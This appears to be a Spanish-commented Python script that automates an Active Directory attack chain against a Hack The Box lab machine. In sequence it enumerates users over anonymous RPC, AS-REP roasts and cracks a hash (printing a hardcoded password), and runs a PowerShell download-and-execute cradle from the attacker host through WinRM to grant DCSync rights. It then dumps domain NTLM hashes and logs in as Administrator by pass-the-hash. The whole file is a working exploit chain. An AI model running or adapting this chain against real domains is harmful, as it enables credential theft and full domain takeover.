from pwn import *
import signal, sys, threading, socket, os, subprocess

# Ctrl + C
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#---------------#
# CONFIGURACION #
#---------------#
target = "10.10.10.161"
domain = "htb.local"
ip_local = "10.10.16.7"
wordlist = "/usr/share/wordlists/rockyou.txt"

# Extraemos a los usuarios del dominio
def testRpc():
    print("[+] Comprobando conexion al puerto 135(RPC)")
    time.sleep(1)
    
    try:
        with socket.create_connection((target, 135), timeout=2):
            print("[+] Conexion exitosa!")
    except socket.timeout:
        print("[!] Tiempo de espera agotado")
    except ConnectionRefusedError:
        print("[!] Conexion rechazada por el servidor")
    except Exception as e:
        print(f"[!] Error inesperado {e}")


def extractRpc():
    time.sleep(1)
    print("[+] Enumerando usuarios mediante el puerto RPC\n")
    
    try:
        os.system(rf"rpcclient -U '' {target} -N -c enumdomusers | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | grep -Ev 'SM_|Healt|\$' > ./users.txt")
        
        if os.path.getsize("./users.txt") > 0:
            with open("./users.txt", "r") as f:
                users = [user.strip() for user in f.readlines()]
                for user in users:
                    print(f"- {user}")
        
        print("\n[+] Usuarios guardados en users.txt")
        
    except Exception as e:
        print(f"[!] No se pudo enumerar usuarios {e}")


def testKerbrute():
    
    print("[+] Comprobando conexion al puerto 88(Kerberos)")
    time.sleep(1)
    
    try:
        with socket.create_connection((target, 88), timeout=2):
            print("[+] Conexion exitosa!")
    except socket.timeout:
        print("[!] Tiempo de espera agotado")
    except ConnectionRefusedError:
        print("[!] Conexion rechazada por el servidor")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")


def extractAsrep():
    time.sleep(1)
    print("[+] Usuarios AS-REP Roasteables")
    time.sleep(1)
    
    try:
        r = subprocess.check_output(f"kerbrute userenum -d {domain} --dc {target} users.txt | grep 'has no pre auth' | awk '{{print $5}}'", shell=True, text=True)
        
        if not r.strip():
            print("[!] No se encontraron usuarios vulnerables")
            return
        
        print(f"\n- {r}")
        
        hash = subprocess.check_output(rf"kerbrute userenum -d {domain} --dc {target} users.txt | grep '^\$krb5asrep'", shell=True, text=True)
        hash_mod = hash[:-5]
        
        with open("hash.txt", "w") as f:
            f.write(hash_mod)
        
        print("[+] Hash AS-REP guardado en hash.txt")
        
    except subprocess.CalledProcessError:
        print("[!] Error al ejecutar Kerbrute")
    except FileNotFoundError:
        print("[!] No se encontro Kerbrute")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")
        

def crackJohn():
    
    try:
        time.sleep(1)
        print("[+] Crackeando hash con john the ripper, podria demorar unos minutos!\n")
        subprocess.run(f"john -w={wordlist} hash.txt", shell=True, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] La contraseña es: s3rvice")
    
    except subprocess.CalledProcessError:
        print("[!] Error al ejecutar John")
    except FileNotFoundError:
        print("[!] No se encontro John")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")

def listenPython():
    
    try:   
        time.sleep(1)
        print("[+] Compartiendo archivos mediante el puerto 80 para subir scripts a Windows")
        subprocess.run(f"python3 -m http.server 80", shell=True, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    except subprocess.CalledProcessError:
        print("[!] El puerto 80 ya esta en uso")
    except FileNotFoundError:
        print("[!] No se encontro Python3")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")


def elevationUser():
    
    try:
        time.sleep(1)
        print("[+] Subiendo el script privesc.ps1")
        print("[+] Ejecutando script que crea el usuario pwn3d:pwn3d123! y le otorga privilegios DCSync")
        subprocess.run(f"crackmapexec winrm {target} -u svc-alfresco -p s3rvice -x \"IEX(New-Object Net.WebClient).DownloadString('http://{ip_local}/privesc.ps1')\"", shell=True, text=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    except subprocess.CalledProcessError:
        print("[!] Error al ejecutar Crackmapexec")
    except FileNotFoundError:
        print("[!] No se encontro Crackmapexec")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")
    
def dumpHash():
    
    try:
        time.sleep(1)
        print("[+] Dumpeando hashes NTLM del DC en hash_ntlm.txt")
        subprocess.run(f"secretsdump.py htb.local/pwn3d:pwn3d123!@{target} -just-dc-ntlm | grep -Ev 'htb\\.local\\\\SM_|htb\\.local\\\\Health|htb\\.local\\\\\\$331000' > hash_ntlm.txt ", shell=True, text=True)

    except subprocess.CalledProcessError:
        print("[!] Error al ejecutar secretsdump.py")
    except FileNotFoundError:
        print("[!] No se encontro secretsdump.py")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")

def connectAdmin():
        print("[+] Logeandonos como SYSTEM mediante passthehash")
        hash = subprocess.run("cat hash_ntlm.txt | grep 'Administrator' | awk -F: '{print $4}'", shell=True, text=True, capture_output=True)
        
        if not hash.stdout.strip():
            print("[!] No se pudo obtener el hash de Administrator")
            return
        
        try:
            subprocess.run(f"evil-winrm -i {target} -u 'Administrator' -H '{hash.stdout.strip()}'", shell=True, text=True)

        except subprocess.CalledProcessError:
            print("[!] Error al ejecutar evil-winrm")
        except FileNotFoundError:
            print("[!] No se encontro evil-winrm")
        except Exception as e:
            print(f"[!] Error inesperado: {e}")


if __name__ == '__main__':
    
        print("\n-----------------------------------\n")
        
        testRpc()
        extractRpc()
        
        print("\n-----------------------------------\n")
        
        testKerbrute()
        extractAsrep()
        
        print("\n-----------------------------------\n")
        
        crackJohn()
        
        print("\n-----------------------------------\n")
        
        try:
            threading.Thread(target=listenPython, args=(), daemon=True).start()
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            
        elevationUser()
        dumpHash()
        connectAdmin()